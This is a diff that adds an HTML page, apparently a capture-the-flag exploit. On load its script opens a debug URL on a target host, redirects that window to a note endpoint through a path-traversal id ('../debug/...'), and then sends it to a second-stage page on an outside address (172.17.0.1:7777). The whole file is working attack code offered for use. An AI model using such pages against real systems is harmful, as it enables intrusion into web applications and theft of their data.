@@ -1,0 +1,20 @@
+<html>
+    <head></head>
+    <body>
+        <script>
+            async function doStuff() {
+                const host = 'http://me'
+                const node_id = '966b77b8-c533-45b9-b1cf-3496dc99ed38';
+
+                const w = window.open(`${host}/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/${node_id}`);
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                w.location = `${host}/note/meow?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/${node_id}`;
+
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                w.location = 'http://172.17.0.1:7777/back2.html';
+            }
+            doStuff();
+        </script>
+    </body>
+</html>
